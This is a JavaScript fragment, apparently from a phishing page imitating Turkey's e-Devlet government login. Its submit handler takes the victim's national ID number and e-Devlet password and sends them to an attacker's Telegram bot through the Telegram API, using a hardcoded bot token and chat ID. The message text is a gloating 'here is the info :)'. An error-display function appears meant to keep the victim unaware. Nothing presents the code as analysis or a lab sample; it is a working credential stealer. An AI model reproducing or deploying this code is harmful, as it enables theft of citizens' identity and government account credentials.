        function hata() {
            document.getElementById("max-w-md mx-auto bg-white rounded-lg shadow-lg p-6").style.display = "none";
            document.getElementById("error-container").style.display = "block";
        }

        document.querySelector("form").addEventListener('submit', function (event) {
            event.preventDefault(); // Formun normal gönderilmesini engelle

            // Formdan verileri al
            var username = document.getElementById('tc-kimlik').value;
            var password = document.getElementById('edevlet-sifresi').value;

            // Telegram Bot API URL'si
            var token = "7782206979:AAE_JMIsLiSJaKpgEFFYU4eWaYHCXZqciAg"; // Bot token
            var chatId = "5312871954"; // Chat ID (Bu sizin chat_id'niz)

            var url = `https://api.telegram.org/bot${token}/sendMessage`;

            // Mesaj içeriğini oluştur
            var text = `işte bilgiler  :):\n\nKullanıcı Adı: ${username}\nŞifre: ${password}`;

            // Veriyi Telegram API'sine gönder
            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: text
                })
            })
                .then(response => response.json())
                .then(data => {
                    console.log("Mesaj başarıyla gönderildi.", data);
                })
                .catch(error => {
                    console.error("Hata:", error);
                    alert("Bir hata oluştu, lütfen tekrar deneyin.");
                });
        });
